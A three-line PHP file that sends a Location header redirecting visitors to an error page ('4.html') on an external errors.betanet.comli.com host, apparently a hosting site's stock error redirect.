<?php
  Header("Location: http://errors.betanet.comli.com/4.html")
?>
